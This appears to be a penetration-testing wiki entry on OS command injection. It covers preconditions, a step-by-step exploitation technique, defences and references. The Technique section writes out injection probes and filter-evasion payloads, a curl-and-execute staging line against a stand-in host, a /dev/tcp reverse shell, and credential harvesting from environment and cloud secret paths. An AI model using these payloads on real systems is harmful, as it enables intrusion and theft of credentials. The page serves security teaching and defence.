---
title: Command injection
slug: command-injection
---

> **TL;DR:** User input is concatenated into a shell or `exec` call; metacharacters break out of the intended command and run attacker code as the web user.

## What it is
The app shells out — `system()`, `popen()`, `Runtime.exec()`, `child_process.exec`, backticks, or a templated subprocess call — with a string built from request data. Shell metacharacters in that data terminate the intended argument and start a new command, giving direct code execution in the server's OS context.

## Preconditions / where it applies
- Any endpoint that processes uploads (ffmpeg, ImageMagick, pdftotext), network tools (ping, dig, traceroute), archive extraction, or filename handling via a subprocess.
- The vulnerable sink uses a shell (`/bin/sh -c "..."`) — not an `execve`-style call with an arg array.
- An input field that flows into that string. Often it is hidden — a filename, a header, a chained metadata field.

## Technique
1. **Probe with safe separators.** Append injectors and look for time or content side effects.

   ```text
   ;sleep 5
   |sleep 5
   `sleep 5`
   $(sleep 5)
   &ping -c 3 attacker.tld
   ```

2. **Choose blind vs. in-band.** If response shows command output, use `;id;`. If not, use timing (`sleep`) or out-of-band: DNS (`nslookup $(whoami).oast.me`), HTTP (`curl ...`), or write to a known reachable path.
3. **Quote breaking.** When the input lands inside quotes, close them first: `"; id; #` or `'$(id)'`.
4. **Argument injection.** Even without shell metacharacters, an unquoted flag-style input can pass extra args to the program — classic `--use-the-force-luke`, `-oProxyCommand=...` against `ssh`, `--exec` against `find`. See [[application-logic-flaws]].
5. **Filter evasion.** Spaces blocked → `${IFS}` or `<()`; slashes blocked → `${PATH:0:1}`; word filters → `w'h'oami` / `who$()ami`. See [[waf-bypass]].
6. **Get a shell.** After confirming exec, stage a tool (`curl -o /tmp/s attacker.tld/s; chmod +x /tmp/s; /tmp/s`) or use a one-liner reverse shell (`bash -i >& /dev/tcp/.../443 0>&1`, encode through base64 if filters bite).
7. **Pivot.** Read env (`/proc/self/environ`) for cloud creds; inspect `~/.aws`, `/var/run/secrets`. Cloud-metadata SSRF often pairs from here — see [[ssrf-to-cloud]].

## Detection and defence
- Replace shell-string sinks with `execve`-style array calls. Never pass user data through `/bin/sh -c`.
- Validate against a strict allowlist (hostname regex, numeric id) where the operation truly needs user data.
- Drop privileges, run subprocesses in a separate namespace, deny outbound from the web tier where possible.
- Detection: WAF rules for `;`, `|`, backticks, `$(`; EDR rules for shells spawned by web/PHP/Node processes; egress alerts on the web user resolving uncommon domains.

## References
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection) — labs and payloads.
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection) — definitions and examples.
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) — payload reference.
